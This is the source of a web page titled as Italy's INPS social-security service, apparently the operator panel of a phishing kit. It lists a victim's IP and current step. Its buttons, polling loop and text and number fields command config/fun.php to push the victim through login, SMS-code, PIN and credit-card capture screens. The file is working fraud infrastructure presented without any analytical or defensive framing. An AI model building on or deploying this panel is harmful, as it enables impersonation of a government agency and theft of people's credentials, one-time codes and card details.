<!DOCTYPE html>

<html lang="IT" class="no-js" data-kantu="1">
<head>
       <link rel="stylesheet" href="file/bootstrap-3.3.6.min.css">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>INPS | Sedi INPS - Informazioni e prenotazioni</title>
    <meta name="language" content="IT">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="x-ua-compatible" content="IE=Edge">
        <style type="text/css">
          a{
                        font-size: 13px;
                        font-family: Arial;
                        font-weight: bold;
                        padding: 11px 16px;
                        vertical-align: top;
                        background: #0b6ba8;
                        border: 1px solid #0b6ba8;
                        color: #fdfdff;
                        width: 100px;
                        margin-top: 14px;
                        text-decoration: none;
                            display: block;
          }
          td{
            padding: 23px !important;
          }
          table{
          width: 400px !important
          }
          

        </style>
</head>






<body class="bussola collapsible" ng-app="sa_app"  ng-controller="controller" ng-init="show_data()">


<table class="table">
  <thead class="thead-light">
    <tr>
      <th scope="col">#</th>
      <th scope="col">IP</th>
      <th scope="col">ACTION</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th scope="row">1</th>
      <td>{{ip}}</td>
      <td>{{fun}}</td>
    </tr>
    <tr>
 
      <td colspan="3">{{text}}</td>
    </tr>
  </tbody>

</table>


 <hr>
  

<table class="table">
  <tbody>
    <tr>
      <td> <a href=""ng-click="gotoLOG()" style="display:initial;">LOG</a></td>
      <td> <a href=""ng-click="gotoSMS()" style="display:initial;">SMS</a></td>
      <td> <a href=""ng-click="gotoPIN()" style="display:initial;">PIN</a></td>

    </tr>
 
    <tr>
      <td> <a href=""ng-click="gotoSendSMS()" style="display:initial;">S-SMS</a></td>
      <td> <a href=""ng-click="gotoSendOK()" style="display:initial;">OK</a></td>
      <td> <a href=""ng-click="gotoSendNO()" style="display:initial;">NO</a></td>
    </tr>

    <tr>
      <td> <a href=""ng-click="gotoCC()" style="display:initial;">CC</a></td>
      <td> <a href=""ng-click="gotoFIN()" style="display:initial;">FIN</a></td>
    </tr>



    <tr>
      <td colspan="2"> <input type="text" id="txtnum" style="width:100%" value="{{num}}"></td>
      <td> <a href=""ng-click="ADDNUM()" style="display:initial; margin-top: 10px;">E-NUM</a></td>
    </tr>  
    <tr>
      <td colspan="2"> <textarea id="txttxt" style="width:100%">{{text}}</textarea></td>
      <td> <a href=""ng-click="ADDTEXT()" style="display:initial; margin-top: 10px;">E-TEXT</a></td>
    </tr>  
  </tbody>

</table>
<br><br>



</body>

 <script src="file/jquery.min.js"></script>
 <script src="file/angular.min.js"></script>
 <script src="file/dirPaginate.js"></script>

<script> 

var fetch = angular.module('sa_app', ['angularUtils.directives.dirPagination']);

fetch.controller('controller', ['$scope', '$http','$filter', function ($scope, $http,$filter) {
    var urlx = window.location.pathname;
    var pathname = urlx.replace("fin.php", "");

    $scope.info_User={};
    $scope.ip="";
    $scope.fun="";
    $scope.text="";
    $scope.num="";

     $scope.base_url=""

     $scope.ip = getUrlParameter('ip');
    console.log( $scope.ip);


    setInterval(function() {
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=3",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
            console.log(data)
               $scope.ip=data.data.ip;
               $scope.fun=data.data.fun;
               $scope.text=data.data.text;
               $scope.num=data.data.num;

   
           });
    }, 1000);


   //ADDTEXT
    $scope.ADDNUM = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            Detaile.num= $("#txtnum").val() ;
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=6",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
             console.log(data);
   
           });
    }

   //ADDTEXT
    $scope.ADDTEXT = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            Detaile.text= $("#txttxt").val() ;
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=5",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
             console.log(data);
   
           });
    }

    $scope.addUser = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            Detaile.fun= "N";
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=1",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
               console.log(data);
   
           });
    }

    $scope.gotoSendSMS = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            Detaile.fun= "gotoSendSMS";
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=2",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
             console.log(data);
   
           });
    }


    $scope.gotoSendOK = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            Detaile.fun= "gotoSendOK";
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=2",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
             console.log(data);
   
           });
    }

    $scope.gotoSendNO = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            Detaile.fun= "gotoSendNO";
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=2",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
             console.log(data);
   
           });
    }









    $scope.gotoCC = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            Detaile.fun= "gotoCC";
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=2",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
             console.log(data);
   
           });
    }






    $scope.gotoSMS = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            Detaile.fun= "gotoSMS";
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=2",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
             console.log(data);
   
           });
    }

    $scope.gotoLOG = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            Detaile.fun= "gotoLOG";
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=2",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
             console.log(data);
   
           });
    }

    $scope.gotoPIN = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            Detaile.fun= "gotoPIN";
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=2",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
             console.log(data);
   
           });
    }

    $scope.gotoFIN = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            Detaile.fun= "gotoFIN";
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=2",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
             console.log(data);
   
           });
    }

 
    $scope.updateUserSMS = function(){ 
            var Detaile = {}; 
            Detaile.ip=  $scope.ip;
            Detaile.fun= "GotoSMS";
            $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=2",
                 data: JSON.stringify(Detaile), 
                  headers: {'Content-Type': 'application/json'}
           }).then(function(data) {
             console.log(data);
   
           });
    }

    function getUrlParameter(sParam) {
        var sPageURL = window.location.search.substring(1),
            sURLVariables = sPageURL.split('&'),
            sParameterName,
            i;

        for (i = 0; i < sURLVariables.length; i++) {
            sParameterName = sURLVariables[i].split('=');

            if (sParameterName[0] === sParam) {
                return sParameterName[1] === undefined ? true : decodeURIComponent(sParameterName[1]);
            }
        }
        return false;
    };


}]);

</script>  





</html>